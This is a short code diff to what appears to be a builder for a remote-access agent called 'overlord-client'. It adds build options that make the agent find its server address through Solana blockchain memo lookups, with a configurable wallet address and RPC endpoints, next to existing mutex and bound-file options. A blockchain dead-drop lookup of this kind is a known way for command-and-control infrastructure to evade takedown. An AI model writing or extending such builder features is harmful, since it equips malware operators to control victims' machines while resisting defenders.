@@ -700,6 +700,24 @@ func runBoundFiles() {
         sendToStream({ type: "output", text: "Raw server list: enabled\n", level: "info" });
       }
 
+      if (config.solMemo) {
+        const solFlag = "-X overlord-client/cmd/agent/config.DefaultServerURLIsSol=true";
+        ldflags = ldflags ? `${ldflags} ${solFlag}` : solFlag;
+        sendToStream({ type: "output", text: "Solana memo lookup: enabled\n", level: "info" });
+
+        if (config.solAddress) {
+          const solAddrFlag = `-X overlord-client/cmd/agent/config.DefaultSolAddress=${config.solAddress}`;
+          ldflags = `${ldflags} ${solAddrFlag}`;
+          sendToStream({ type: "output", text: `Solana address: ${config.solAddress}\n`, level: "info" });
+        }
+
+        if (config.solRpcEndpoints) {
+          const solRpcFlag = `-X overlord-client/cmd/agent/config.DefaultSolRPCEndpoints=${config.solRpcEndpoints}`;
+          ldflags = `${ldflags} ${solRpcFlag}`;
+          sendToStream({ type: "output", text: `Solana RPC endpoints: ${config.solRpcEndpoints}\n`, level: "info" });
+        }
+      }
+
       if (buildMutex) {
         const mutexFlag = `-X overlord-client/cmd/agent/config.DefaultMutex=${buildMutex}`;
         ldflags = ldflags ? `${ldflags} ${mutexFlag}` : mutexFlag;
